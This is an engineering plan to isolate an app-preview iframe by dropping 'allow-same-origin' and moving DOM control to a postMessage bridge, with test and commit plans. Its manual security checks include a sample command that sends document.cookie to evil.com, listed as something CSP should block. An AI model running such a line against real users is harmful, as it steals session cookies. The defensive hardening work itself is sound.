# Phase 2 Plan: Iframe Origin Isolation + DOM Bridge Refactor

**Status:** planned, not started
**Depends on:** Phase 0 (CSP + OAuth scope reduction) — ✅ complete
**Blocks:** Phase 4 (URL sharing to strangers) — isolation must exist before stranger-authored artifacts ship
**See also:** [V1_PLAN.md](V1_PLAN.md) for the overall sequencing

## Problem statement

The app preview iframe currently uses `sandbox="allow-scripts allow-same-origin"`. The `allow-same-origin` flag defeats isolation: the iframe gets agex.studio's real origin and can read parent's `localStorage`, OAuth tokens, IndexedDB, and DOM.

For the current PoC (one user, their own tab, their own agent) this is acceptable. Once Phase 4 ships **stranger-authored artifacts** to strangers, it is not. A malicious app in a published artifact would run with access to the recipient's API keys and all cached session data.

Removing `allow-same-origin` gives the iframe an **opaque origin** — it cannot reach parent state. But removing the flag naively breaks `test_app` and `live_app`, which depend on direct `iframe.contentDocument` / `iframe.contentWindow` access from the parent.

This plan covers refactoring those flows to use `postMessage` instead, then flipping the sandbox attribute.

## Current architecture — what requires `allow-same-origin`

Four surfaces break if the flag is dropped without refactor:

1. **`executeActions()`** (`pyodide.js:636`) uses `iframe.contentDocument.querySelector()` for every action type (`click`, `type`, `select`, `read`) plus `iframe.contentWindow.eval()` for `eval`.
2. **`collectResults()`** (`pyodide.js:706`) reads the iframe's log buffer via `iframe.contentWindow.__agex_logs`.
3. **`captureScreenshot()`** (`pyodide.js:606`) runs html2canvas in the *parent* against the *iframe's* DOM, accessed via `iframe.contentDocument`.
4. **Related helpers** — the iframe reference itself is fine; only inside-DOM accessors break.

Already safe for sandbox (no changes needed):

- Query bridge (already postMessage-based)
- `waitForIdle()` — uses `iframe.__onQueryDone`, a parent-side property on the iframe *element*, not cross-origin
- `iframe.onload`, `iframe.src`, `iframe.remove()`, `event.source` identity comparison
- Parent's message handlers don't validate `event.origin`, so no loosening needed

## Target architecture

Add an **agent-control bridge** inside the iframe, parallel to the existing `QUERY_BRIDGE_SCRIPT`. Parent sends action commands via postMessage; iframe executes on its own DOM and posts results back with a correlation ID.

```
Parent (agex.studio origin)                  Iframe (opaque origin)
───────────────────────────                  ──────────────────────
executeActions(iframe, actions):             (listens for 'agex-control':)
  for action in actions:                       switch action.type:
    id = uuid()                                  'click'     → el.click()
    iframe.postMessage({                         'type'      → set value + event
      type: 'agex-control',     ──────▶          'select'    → set value + event
      id, action                                 'read'      → read el[prop]
    })                                           'eval'      → eval(expr)
    result = await responseFor(id)               'screenshot'→ html2canvas(el)
                              ◀──────           'get-logs'  → __agex_logs
                                                 postMessage back with
collectResults(iframe):                          { type: 'agex-control-result',
  sendControl('get-logs')                          id, data | error }
  ↑ same pattern
```

## File-by-file changes

### `pyodide.js`

- **New**: `AGENT_CONTROL_BRIDGE_SCRIPT` — inline `<script>` injected into `buildAppHtml` that registers the message listener and dispatches actions on the iframe's own DOM.
- **New**: add `html2canvas` to `CDN_IMPORTS` so the iframe can load it for screenshots (moves html2canvas from parent to iframe).
- **Modified**: `buildAppHtml` injects `AGENT_CONTROL_BRIDGE_SCRIPT` alongside `CONSOLE_INTERCEPTOR` and `QUERY_BRIDGE_SCRIPT`.
- **Modified**: `executeActions` replaces every `iframe.contentDocument.*` call with a postMessage round-trip via a new helper `sendControl(iframe, action)`.
- **Modified**: `collectResults` replaces `iframe.contentWindow.__agex_logs` with a `sendControl({type: 'get-logs'})` call.
- **Removed**: `captureScreenshot` from parent (logic moves into iframe's control handler).
- **Modified**: `runTestApp` — change `iframe.sandbox = 'allow-scripts allow-same-origin'` → `'allow-scripts'`.

### `AppPreview.svelte`

- Change `sandbox="allow-scripts allow-same-origin"` → `sandbox="allow-scripts"` on the preview iframe.
- `handleMessage` unchanged (source-identity check works; no origin check to loosen).

### No changes needed

- `QUERY_BRIDGE_SCRIPT` (already postMessage-based)
- `waitForIdle` (parent-side property)
- `setLiveIframe` / `setQueryHandler` (reference-based)

## Edge cases

1. **html2canvas + CORS.** html2canvas now runs inside the iframe. For apps loading images from remote URLs, html2canvas requires CORS-enabled responses to avoid tainting the canvas. Most public image CDNs serve proper CORS headers; some (e.g., Pokémon fan sites) may not. **Pre-existing screenshot limitation**, not introduced by the refactor — but worth noting since it may look newly-broken after this change.

2. **`eval` action complexity.** The control handler runs `eval(action.eval)` inside the iframe. Result needs JSON-safe serialization for postMessage. We stringify via `String(val ?? '')` (same as current behavior).

3. **`read` action property access.** The handler does `el[prop]` where `prop` is agent-supplied. Some properties return non-serializable values (computed styles, event handlers). `String(el[prop] ?? '')` handles most cases; edge cases return `'[object Object]'` which matches current behavior.

4. **Message correlation under concurrency.** Each action gets a unique ID; parent awaits a specific response ID. Current code doesn't emit concurrent actions, but the ID design keeps that option open.

5. **Error propagation.** If the iframe's handler throws, it posts back `{error: msg}`; the parent's `sendControl` promise rejects. Integrate with the existing `try/catch` in `executeActions` so one bad action doesn't poison the rest.

6. **Timing overhead.** Each action round-trips through postMessage instead of a direct call. Adds ~1ms per action; imperceptible for typical action lists.

7. **Iframe readiness.** The control bridge script must be installed before `executeActions` runs. As an inline script in `<head>`, it runs synchronously at load. `waitForIdle` confirms the app has settled before actions begin.

8. **Flood detection unaffected.** `AppPreview.svelte`'s flood detection watches `agex-query` messages (iframe→parent). Control messages are `agex-control` (parent→iframe), a different type, not tripping flood detection.

## Test strategy

The postMessage-based design is much easier to test than the direct-DOM code it replaces. Each action type becomes a small, isolated test.

### Pattern: factor bridge handler as a pure function

Currently `AGENT_CONTROL_BRIDGE_SCRIPT` would be a template-literal string. For testability, factor the handler logic:

- A real JS module `src/lib/iframe-bridge.js` exports `handleControlMessage(document, message) → response`
- `AGENT_CONTROL_BRIDGE_SCRIPT` becomes a thin shim that imports (or inlines) the function and wires it to `window.addEventListener('message', ...)`
- Tests target the module directly using jsdom's `document`

### Layer 1: unit tests for each action dispatcher (jsdom)

```javascript
// iframe-bridge.test.js
describe('handleControlMessage', () => {
  it('click: invokes click() on matching element', () => {
    document.body.innerHTML = '<button id="go">Go</button>';
    const spy = vi.spyOn(document.getElementById('go'), 'click');
    const response = handleControlMessage(document, {
      type: 'agex-control', id: 'x1',
      action: { click: '#go' },
    });
    expect(spy).toHaveBeenCalled();
    expect(response).toMatchObject({ id: 'x1', error: null });
  });

  it('read: returns textContent by default', () => { ... });
  it('read: returns specified prop', () => { ... });
  it('type: dispatches input and change events', () => { ... });
  it('eval: returns String(result)', () => { ... });
  it('eval: returns error on throw', () => { ... });
  it('get-logs: returns window.__agex_logs contents', () => { ... });
  // screenshot is mocked to avoid importing html2canvas in unit tests
});
```

6–8 test cases, each 10–20 lines. Covers the core behavior contract.

### Layer 2: integration test for the message round-trip

```javascript
// control-bridge-integration.test.js
describe('sendControl → iframe handler round-trip', () => {
  it('click action completes and resolves with result', async () => {
    // Set up a mock iframe where postMessage invokes the bridge
    // handler synchronously and responds via a simulated parent listener
    const iframe = createMockIframe({
      initialHTML: '<button id="go">Go</button>',
    });
    const result = await sendControl(iframe, { click: '#go' });
    expect(result.error).toBeNull();
  });
});
```

Verifies parent-side `sendControl` helper wires up correctly: correct message shape, correlation ID handling, response routing.

### Layer 3: NOT doing in this phase

- **Real-browser tests** (playwright/cypress) — too heavy for Phase 2; defer to a pre-release manual-pass checklist.
- **Svelte component tests** (`AppPreview.svelte` interactions) — worthwhile but a separate investment; not blocking.
- **html2canvas output correctness** — treat as a black box; test invocation, not pixel accuracy.

### Security verification (manual, after code change)

Run in the iframe's devtools console after loading a test app:

- `window.parent.localStorage` → should throw (opaque origin blocks parent DOM access)
- `fetch('https://evil.com?x=' + document.cookie)` → blocked by CSP `connect-src`
- Attempt IndexedDB access → different storage partition, isolated from parent's `agex-studio` database

## Commit plan

Three commits for bisect-friendliness. Each commit includes tests for the surface it touches.

### Commit 1: `feat(preview): add agent-control bridge inside iframe`

- Create `src/lib/iframe-bridge.js` with `handleControlMessage(doc, msg)` exported as a pure function
- Create `AGENT_CONTROL_BRIDGE_SCRIPT` in `pyodide.js` as the script wrapper
- Add `html2canvas` to `CDN_IMPORTS`
- Wire bridge into `buildAppHtml`
- **Tests**: unit tests for each action dispatcher (Layer 1 above)
- Both old and new paths coexist; existing behavior unchanged

### Commit 2: `refactor(preview): route executeActions/collectResults through control bridge`

- Add `sendControl(iframe, action)` helper in `pyodide.js`
- Replace `iframe.contentDocument.*` calls in `executeActions` with `sendControl` calls
- Replace `iframe.contentWindow.__agex_logs` in `collectResults` with `sendControl({type: 'get-logs'})`
- Remove parent-side `captureScreenshot` (logic moved to iframe bridge)
- **Tests**: integration test for `sendControl` round-trip (Layer 2 above)
- `allow-same-origin` still present; bridge now serves all action traffic

### Commit 3: `chore(preview): drop allow-same-origin on app iframe`

- Change `sandbox="allow-scripts allow-same-origin"` → `sandbox="allow-scripts"` in both `AppPreview.svelte` and `runTestApp`
- **Tests**: existing suite acts as regression check; no new tests
- Security verification: run the console checks above manually
- This is the actual security win

## Effort estimate

~3–4 days of focused work:
- Day 1: Commit 1 — bridge script + unit tests
- Day 2: Commit 2 — sendControl refactor + integration tests
- Day 3: Commit 3 — sandbox flip + manual security verification; fix whatever surfaces
- Day 4 buffer: bug fixes, html2canvas-in-iframe edge cases, CORS surprises on sample apps

Testing overhead: roughly +30% over the refactor alone. Buys:
- A regression baseline before the sandbox change (step 3 becomes low-risk)
- Executable docs for the bridge protocol
- A pattern to extend in future phases (bridge as a structured message API)

## Post-phase followup

- **Document the bridge protocol** somewhere agent-facing so future interactive-app skills or documentation can reference it if extended.
- **Watch for `allow-same-origin` regressions** in any future iframe work — the default should now be "opaque unless there's a reason."
- **Consider extending the bridge** for any new action types as they're needed (e.g., file download from iframe, clipboard access under allow-list).
